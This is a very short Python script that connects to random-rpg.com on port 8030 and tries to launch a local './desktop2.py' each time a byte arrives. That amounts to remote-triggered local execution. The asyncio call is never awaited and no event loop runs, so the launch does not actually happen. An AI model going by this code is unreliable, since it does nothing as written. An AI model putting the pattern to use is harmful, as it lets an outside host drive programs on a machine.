#!/usr/bin/env python3.7

import socket
import asyncio

aws = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
aws.connect(('random-rpg.com', 8030))

while True:
	_ = aws.recv(1)
	asyncio.create_subprocess_exec("./desktop2.py")
